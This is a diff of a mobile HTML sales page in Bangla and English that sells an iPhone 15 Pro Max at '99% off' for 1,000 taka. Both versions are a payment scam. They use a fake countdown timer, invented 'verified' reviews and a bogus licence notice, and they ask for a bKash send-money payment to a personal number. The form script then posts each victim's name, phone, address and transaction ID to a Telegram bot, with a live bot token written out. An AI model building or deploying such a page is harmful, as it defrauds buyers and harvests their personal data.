@@ -3,184 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium iPhone Offer</title>
+    <title>iPhone 15 Pro Max - Limited Offer</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap');
-        body { font-family: 'Hind Siliguri', sans-serif; background-color: #f3f4f6; color: #111827; margin: 0; overflow-x: hidden; }
-        
-        .slider-container { width: 100%; overflow: hidden; position: relative; background: white; shadow: inset 0 2px 4px rgba(0,0,0,0.06); }
-        .slides { display: flex; transition: transform 0.7s ease-in-out; }
-        .slide { min-width: 100%; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .slide img { width: 100%; max-height: 450px; object-fit: contain; }
-
-        .variant-btn { border: 2px solid #e5e7eb; padding: 8px 16px; border-radius: 12px; cursor: pointer; transition: all 0.3s; font-size: 12px; font-weight: bold; background: #f9fafb; color: #6b7280; }
-        .variant-btn.active { border-color: #2563eb; bg-blue-50; color: #2563eb; shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
-
-        @keyframes pulse-custom {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        .btn-buy { animation: pulse-custom 2s infinite; background-color: #22c55e; }
-        
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
-        .modal.active { display: flex; }
+        body { font-family: 'Hind Siliguri', sans-serif; background-color: #003d33; color: white; margin: 0; }
+        .hero-bg { background: radial-gradient(circle at top, #005d4f 0%, #003d33 100%); }
+        .gold-text { color: #d4af37; }
+        .review-card { background: #fdfdfd; color: #333; border-radius: 15px; padding: 12px; text-align: center; height: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .buy-btn { background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); box-shadow: 0 4px 15px rgba(59, 130, 246, 0.5); }
+        .input-field { background: rgba(255,255,255,0.1); border: 1px solid rgba(212, 175, 55, 0.3); color: white; }
+        .input-field::placeholder { color: #aaa; }
     </style>
 </head>
-<body>
-    <div class="max-w-md mx-auto bg-white min-h-screen pb-32 shadow-2xl relative">
+<body class="max-w-md mx-auto relative min-h-screen pb-24">
+
+    <div class="bg-red-700 text-white text-center py-2 font-bold sticky top-0 z-50 shadow-lg">
+        OFFER ENDS IN: <span id="timer" class="text-yellow-300">29:58 MINS</span>
+    </div>
+
+    <div class="hero-bg p-6 text-center pt-10">
+        <div class="relative inline-block mb-6">
+            <img src="https://i.ibb.co.com/ccCJWnFt/pngwing-com.png" class="w-64 mx-auto drop-shadow-2xl">
+        </div>
         
-        <div class="h-1 shadow-sm"></div>
-
-        <div class="bg-red-600 text-white text-center py-2 font-bold text-sm sticky top-0 z-50 shadow-md">
-            ফ্ল্যাশ সেল শেষ হতে বাকি: <span id="timer">29:58</span> মিনিট
-        </div>
-
-        <div class="slider-container">
-            <div id="slider" class="slides">
-                <div class="slide"><img src="https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png"></div>
-                <div class="slide"><img src="https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png"></div>
-                <div class="slide"><img src="https://i.ibb.co.com/bgBP1D78/3f82de66235c46865d5276b1b69ba22f.png"></div>
-                <div class="slide"><img src="https://i.ibb.co.com/ccCJWnFt/pngwing-com.png"></div>
-                <div class="slide"><img src="https://i.ibb.co.com/hFDwZyLZ/90f5aa1b9a9a95892ef87d1833319da8.png"></div>
-            </div>
-        </div>
-
-        <div class="p-5 rounded-b-[40px] shadow-lg bg-white">
-            <div class="flex justify-between items-start">
-                <h1 class="text-2xl font-black leading-tight text-gray-800">iPhone 15 Pro Max <br><span class="text-gray-400 text-sm font-normal">256GB, Titanium Edition</span></h1>
-                <span class="bg-red-100 text-red-600 text-[10px] font-bold px-2 py-1 rounded-full uppercase">অফিসিয়াল ওয়ারেন্টি</span>
-            </div>
-
-            <div class="mt-4 flex items-baseline gap-3">
-                <span class="text-4xl font-black text-blue-600">৳ ১,০০০</span>
-                <span class="text-lg text-gray-400 line-through">৳ ১,৫৯,০০০</span>
-                <span class="text-green-600 font-bold text-sm">(-৯৯%)</span>
-            </div>
-
-            <div class="mt-6">
-                <p class="text-sm font-bold text-gray-600 mb-3 underline">কালার ভেরিয়েন্ট পছন্দ করুন:</p>
-                <div class="flex gap-3">
-                    <div class="variant-btn active" onclick="selectVariant(this, 'color')">Natural Titanium</div>
-                    <div class="variant-btn" onclick="selectVariant(this, 'color')">Blue Titanium</div>
-                    <div class="variant-btn" onclick="selectVariant(this, 'color')">Black Titanium</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="p-6">
-            <h2 class="text-xl font-black mb-4">ফোনের ফিচারসমূহ:</h2>
-            <div class="grid grid-cols-2 gap-4">
-                <div class="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-center">
-                    <p class="text-xs text-blue-600 font-bold uppercase">ডিসপ্লে</p>
-                    <p class="text-sm font-black mt-1">6.7" Super Retina XDR</p>
-                </div>
-                <div class="bg-purple-50 p-4 rounded-2xl border border-purple-100 text-center">
-                    <p class="text-xs text-purple-600 font-bold uppercase">প্রসেসর</p>
-                    <p class="text-sm font-black mt-1">A17 Pro Chip</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="p-6 bg-white rounded-t-[40px] shadow-inner mt-6">
-            <h2 class="text-xl font-black mb-6">কাস্টমার রিভিউ <span class="text-gray-400 text-sm font-normal">(ভেরিফাইড)</span></h2>
-            <div class="space-y-6">
-                <div class="border-b pb-4">
-                    <div class="flex items-center gap-3 mb-2">
-                        <img src="https://i.ibb.co.com/p6yKw8mK/vzfw2.jpg" class="w-10 h-10 rounded-full border">
-                        <div><h4 class="text-sm font-bold">তানভীর আহমেদ <span class="text-[10px] bg-green-100 text-green-600 px-1 rounded">✔</span></h4><p class="text-[10px] text-gray-500">ঢাকা</p></div>
-                    </div>
-                    <p class="text-sm text-gray-600 italic">"১০০০ টাকায় আইফোন পাবো এটা স্বপ্নের মতো লাগছে!"</p>
-                </div>
-                <div class="border-b pb-4">
-                    <div class="flex items-center gap-3 mb-2">
-                        <img src="https://i.ibb.co.com/tTZjTHc1/fsgsgere.jpg" class="w-10 h-10 rounded-full border">
-                        <div><h4 class="text-sm font-bold">ফারহানা আক্তার <span class="text-[10px] bg-green-100 text-green-600 px-1 rounded">✔</span></h4><p class="text-[10px] text-gray-500">সিলেট</p></div>
-                    </div>
-                    <p class="text-sm text-gray-600 italic">"প্যাকিং খুব প্রিমিয়াম ছিল। সেলারকে ধন্যবাদ!"</p>
-                </div>
-                <div class="border-b pb-4">
-                    <div class="flex items-center gap-3 mb-2">
-                        <img src="https://i.ibb.co.com/TB7gWY1w/wretey4.jpg" class="w-10 h-10 rounded-full border">
-                        <div><h4 class="text-sm font-bold">নিলয় বড়ুয়া <span class="text-[10px] bg-green-100 text-green-600 px-1 rounded">✔</span></h4><p class="text-[10px] text-gray-500">চট্টগ্রাম</p></div>
-                    </div>
-                    <p class="text-sm text-gray-600 italic">"ভেবেছিলাম ভুয়া, কিন্তু ২ দিনের মধ্যে হাতে পেয়ে গেলাম।"</p>
-                </div>
-            </div>
-
-            <div id="order" class="mt-12 bg-gray-50 p-6 rounded-3xl border-2 border-blue-200">
-                <h3 class="text-xl font-black text-center mb-6">অর্ডার ফর্ম</h3>
-                <form id="orderForm" class="space-y-4">
-                    <input type="text" id="name" placeholder="পূর্ণ নাম" class="w-full p-4 rounded-xl border outline-none focus:ring-2 focus:ring-blue-500" required>
-                    <input type="tel" id="phone" placeholder="মোবাইল নাম্বার" class="w-full p-4 rounded-xl border outline-none focus:ring-2 focus:ring-blue-500" required>
-                    <textarea id="address" placeholder="বিস্তারিত ঠিকানা" class="w-full p-4 rounded-xl border outline-none focus:ring-2 focus:ring-blue-500" rows="2" required></textarea>
-                    
-                    <div class="bg-blue-600 text-white p-5 rounded-2xl shadow-lg text-center">
-                        <p class="text-xs font-bold mb-1 opacity-80">বিকাশ ১,০০০৳ (সেন্ড মানি) করুন:</p>
-                        <p class="text-2xl font-black tracking-widest">01870428306</p>
-                        <input type="text" id="trxId" placeholder="ট্রানজাকশন আইডি দিন (TrxID)" class="w-full p-3 mt-4 bg-white text-gray-900 rounded-lg font-bold outline-none" required>
-                    </div>
-                    <button type="submit" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-black text-xl shadow-xl active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
-                </form>
-            </div>
-        </div>
-
-        <div class="fixed bottom-16 left-0 right-0 p-4 z-40">
-            <button onclick="document.getElementById('order').scrollIntoView({behavior: 'smooth'})" class="w-full btn-buy text-white py-4 rounded-2xl text-xl font-black shadow-2xl uppercase">BUY NOW</button>
-        </div>
-
-        <div class="fixed bottom-0 left-0 right-0 h-16 bg-white/80 backdrop-blur-md border-t flex justify-around items-center px-10 text-[10px] font-bold uppercase text-gray-400">
-            <div class="text-blue-600">Home</div>
-            <div>Shop</div>
-            <div>Account</div>
-            <div>Wishlist</div>
+        <h1 class="text-2xl font-bold mb-1">iPhone 15 Pro Max</h1>
+        <p class="text-4xl font-black gold-text mb-2">ONLY 1,000TK!</p>
+        <p class="text-xl font-bold tracking-widest mb-2 uppercase">Limited Time! 99% Off!</p>
+        <p class="text-[10px] text-gray-300 leading-tight opacity-70 px-4">CV986 website is operated and by company number OLR-OCS3H0120 and regulated by Gaming Services under license No 355JAZ.</p>
+        
+        <div class="flex gap-2 justify-center mt-6">
+            <div class="border border-yellow-600/50 rounded-full px-4 py-1 text-xs">Color: Natural Titanium ▾</div>
+            <div class="border border-yellow-600/50 rounded-full px-4 py-1 text-xs">Storage: 256GB ▾</div>
         </div>
     </div>
 
-    <div id="successModal" class="modal">
-        <div class="bg-white p-10 rounded-[40px] text-center shadow-2xl max-w-sm">
-            <div class="text-6xl mb-4 text-green-500">✅</div>
-            <h2 class="text-2xl font-black text-green-600 mb-2">অর্ডার সফল হয়েছে!</h2>
-            <p class="text-gray-600 text-sm">আপনার পেমেন্ট ভেরিফাই করা হচ্ছে। ২-৩ দিনের মধ্যে ডেলিভারি পেয়ে যাবেন। ধন্যবাদ!</p>
-            <button onclick="location.reload()" class="mt-8 w-full bg-gray-900 text-white py-4 rounded-2xl font-bold uppercase">CLOSE</button>
+    <div class="p-6">
+        <h2 class="text-center gold-text text-xl font-bold mb-6 italic underline decoration-yellow-600/30">Customer Reviews</h2>
+        <div class="grid grid-cols-2 gap-3 mb-8">
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/p6yKw8mK/vzfw2.jpg" class="w-8 h-8 rounded-full mx-auto mb-1 object-cover border border-yellow-500">
+                <div class="text-yellow-500 text-[10px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight">১০০০ টাকায় আইফোন বিশ্বাস করতে পারছি না!</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/tTZjTHc1/fsgsgere.jpg" class="w-8 h-8 rounded-full mx-auto mb-1 object-cover border border-yellow-500">
+                <div class="text-yellow-500 text-[10px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight">হাতে পাওয়ার পর অবাক হয়ে গেছি।</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/TB7gWY1w/wretey4.jpg" class="w-8 h-8 rounded-full mx-auto mb-1 object-cover border border-yellow-500">
+                <div class="text-yellow-500 text-[10px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight">সেলারকে অনেক ধন্যবাদ!</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/FkHbFhJB/wyryryryry3.jpg" class="w-8 h-8 rounded-full mx-auto mb-1 object-cover border border-yellow-500">
+                <div class="text-yellow-500 text-[10px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight">অবিশ্বাস্য অফার! সব ঠিকঠাক পেলাম।</p>
+            </div>
+        </div>
+
+        <div id="order" class="bg-black/20 p-6 rounded-3xl border border-yellow-600/20 shadow-inner">
+            <h3 class="text-center text-2xl font-black gold-text mb-6">অর্ডার ফর্ম</h3>
+            <form id="orderForm" class="space-y-4">
+                <input type="text" id="custName" placeholder="আপনার নাম" class="w-full p-4 rounded-xl input-field outline-none" required>
+                <input type="tel" id="custPhone" placeholder="মোবাইল নাম্বার" class="w-full p-4 rounded-xl input-field outline-none" required>
+                <textarea id="custAddress" placeholder="বিস্তারিত ঠিকানা" class="w-full p-4 rounded-xl input-field outline-none" rows="2" required></textarea>
+                
+                <div class="bg-yellow-600/10 border border-yellow-600/30 p-5 rounded-2xl text-center">
+                    <p class="text-xs gold-text font-bold mb-2">বিকাশ (সেন্ড মানি) ১,০০০৳ করুন</p>
+                    <p class="text-2xl font-black tracking-widest text-white">01870428306</p>
+                    <input type="text" id="trxId" placeholder="TrxID দিন" class="w-full p-3 mt-4 bg-white rounded-lg text-black font-bold text-center outline-none" required>
+                </div>
+                
+                <button type="submit" class="w-full py-5 rounded-full bg-green-500 text-black font-black text-xl shadow-lg transform active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="fixed bottom-0 left-0 right-0 max-w-md mx-auto p-4 z-40 bg-[#003d33]/80 backdrop-blur-md">
+        <button onclick="document.getElementById('order').scrollIntoView({behavior: 'smooth'})" class="w-full py-4 rounded-full text-white font-black text-xl buy-btn flex justify-center items-center gap-2">
+            <span>︿</span> BUY NOW
+        </button>
+    </div>
+
+    <div id="successModal" class="fixed inset-0 bg-black/95 z-[100] hidden items-center justify-center p-6">
+        <div class="bg-white text-gray-900 rounded-[40px] p-8 text-center w-full max-w-xs animate-bounce">
+            <div class="text-5xl mb-4">✅</div>
+            <h2 class="text-2xl font-black text-green-600">ধন্যবাদ!</h2>
+            <p class="text-sm font-bold mt-2">আপনার অর্ডারটি গ্রহণ করা হয়েছে এবং খুব শীঘ্রই ডেলিভারি দেওয়া হবে।</p>
+            <button onclick="location.reload()" class="mt-6 w-full py-3 bg-gray-900 text-white rounded-full font-bold">হোমে ফিরে যান</button>
         </div>
     </div>
 
     <script>
-        // স্লাইডার লজিক
-        let currentImg = 0;
+        // Timer
+        let time = 1798;
         setInterval(() => {
-            currentImg = (currentImg + 1) % 5;
-            document.getElementById('slider').style.transform = `translateX(-${currentImg * 100}%)`;
-        }, 3000);
-
-        // ভেরিয়েন্ট লজিক
-        function selectVariant(el) {
-            el.parentElement.querySelectorAll('.variant-btn').forEach(btn => btn.classList.remove('active'));
-            el.classList.add('active');
-        }
-
-        // টাইমার লজিক
-        let timeLeft = 1800;
-        setInterval(() => {
-            if (timeLeft <= 0) return;
-            timeLeft--;
-            let mins = Math.floor(timeLeft / 60);
-            let secs = timeLeft % 60;
-            document.getElementById('timer').innerText = `${mins}:${secs.toString().padStart(2, '0')}`;
+            if(time <= 0) return;
+            time--;
+            let m = Math.floor(time/60);
+            let s = time % 60;
+            document.getElementById('timer').innerText = `${m}:${s.toString().padStart(2, '0')} MINS`;
         }, 1000);
 
-        // টেলিগ্রাম সাবমিট
-        document.getElementById('orderForm').addEventListener('submit', async (e) => {
+        // Telegram Send
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const msg = `🚀 **নতুন অর্ডার!**\n👤 নাম: ${document.getElementById('name').value}\n📞 ফোন: ${document.getElementById('phone').value}\n🏠 ঠিকানা: ${document.getElementById('address').value}\n💰 TrxID: ${document.getElementById('trxId').value}`;
+            const text = `🚀 **New Order!**\nName: ${document.getElementById('custName').value}\nPhone: ${document.getElementById('custPhone').value}\nAddress: ${document.getElementById('custAddress').value}\nTrxID: ${document.getElementById('trxId').value}`;
             
-            await fetch(`https://api.telegram.org/bot8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ/sendMessage`, {
+            fetch(`https://api.telegram.org/bot8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: "5085997009", text: msg, parse_mode: 'Markdown' })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: "5085997009", text: text, parse_mode: 'Markdown'})
+            }).then(() => {
+                document.getElementById('successModal').style.display = 'flex';
             });
-            document.getElementById('successModal').classList.add('active');
         });
     </script>
 </body>
